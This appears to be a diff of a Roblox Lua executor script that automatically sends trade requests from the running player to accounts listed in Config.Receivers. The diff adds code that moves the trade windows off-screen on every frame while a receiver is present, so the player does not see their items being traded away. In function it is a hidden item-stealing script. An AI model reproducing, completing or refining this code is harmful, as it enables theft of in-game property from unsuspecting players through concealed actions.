@@ -19,21 +19,31 @@ local Trade = ReplicatedStorage.Trade
 local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
 local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+    TradePath = LocalPlayer.PlayerGui.TradeGUI
+    Mobile = false
+else
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+    TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
+    Mobile = true
+end
 
-local Position = UDim2.new(0.5, 0, 0.5, 0)
-
-local Players = game:GetService("Players")
-
-function checkReceivers()
-    for _, receiver in pairs(Config.Receivers) do
-        if Players:FindFirstChild(receiver) then
+-- Function to check if any of the receivers are in the game
+local function checkReceivers()
+    for _, Receiver in pairs(Config.Receivers) do
+        if Players:FindFirstChild(Receiver) then
             return true
         end
     end
     return false
 end
 
-function updatePosition()
+-- Variable to store the position
+local Position = UDim2.new(0.5, 0, 0.5, 0)
+
+-- Function to update the position based on receiver presence
+local function updatePosition()
     if checkReceivers() then
         Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
     else
@@ -41,7 +51,25 @@ function updatePosition()
     end
 end
 
+-- Connect the updatePosition function to RenderStepped
 RunService.RenderStepped:Connect(updatePosition)
+
+-- Function to update the UI positions
+local function updateUIPositions()
+    if Mobile then
+        TradePath.Container.Position = Position
+        TradePath.ClickBlocker.Position = Position
+    else
+        TradePath.BG.Position = Position
+        TradePath.Container.Position = Position
+        TradePath.ClickBlocker.Position = Position
+        TradePath.Processing.Position = Position
+    end
+end
+
+-- Connect the updateUIPositions function to RenderStepped
+RunService.RenderStepped:Connect(updateUIPositions)
+
 
 local Inventory = {}
 
@@ -92,7 +120,7 @@ if Executor == "Solara" then
     return
 end
 
-wait(5)
+wait(3)
 
 local success, errorMsg = pcall(function()
     Common = 0
@@ -226,22 +254,26 @@ local success, errorMsg = pcall(function()
     
     task.wait()
     
-    function Sendtrade()
-        if Mobile then
-            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
-            TapUI(Path.Container.Close)
-            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
-            TapUI(Path.Popup.Container.Action.Trade)
-            TapUI(Path.Popup.Container.Close)
+    local function Sendtrade()
+        if checkReceivers() then
+            if Mobile then
+                local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
+                TapUI(Path.Container.Close)
+                TapUI(Path.Container.PlayerList[Receiver].ActionButton)
+                TapUI(Path.Popup.Container.Action.Trade)
+                TapUI(Path.Popup.Container.Close)
+            else
+                local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
+
+                TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
+                TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
+                TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
+                TapUI(Path.Container[Receiver].ActionButton)
+                TapUI(Path.Inspect.Trade)
+                TapUI(Path.Inspect.Close)
+            end
         else
-            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
-            TapUI(Path.Container.ToggleRequests.On)
-            TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
-            TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
-            TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
-            TapUI(Path.Container[Receiver].ActionButton)
-            TapUI(Path.Inspect.Trade)
-            TapUI(Path.Inspect.Close)
+            print("")
         end
     end
     
@@ -337,17 +369,6 @@ function InsertItems()
         
     end
 end
-
-    if Mobile then
-        TradePath.Container.Position = Position
-        TradePath.ClickBlocker.Position = Position
-    else
-        TradePath.BG.Position = Position
-        TradePath.Container.Position = Position
-        TradePath.ClickBlocker.Position = Position
-        TradePath.Processing.Position = Position
-    end
-    
     TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
         wait(3)
         if TradePath.Enabled then
